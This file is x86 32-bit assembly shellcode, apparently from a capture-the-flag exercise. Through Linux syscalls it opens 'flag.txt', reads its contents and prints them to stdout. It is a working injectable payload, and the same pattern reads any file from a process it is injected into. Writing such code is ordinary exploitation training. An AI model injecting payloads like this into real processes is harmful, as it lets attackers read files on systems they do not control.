BITS 32

xor eax, eax
push eax
push 0x7478742e
push 0x67616c66
mov ebx, esp
xor ecx, ecx
mov al, 0x5 ; SYS_open
int 0x80

mov ebx, eax
mov ecx, esp
mov edx, 0xFF
mov eax, 0x3 ; SYS_read
int 0x80

mov edx, eax
mov ecx, esp
mov ebx, 0x1
mov eax, 0x4 ; SYS_write
int 0x80

xor ebx, ebx
xor eax, eax
inc eax
int 0x80
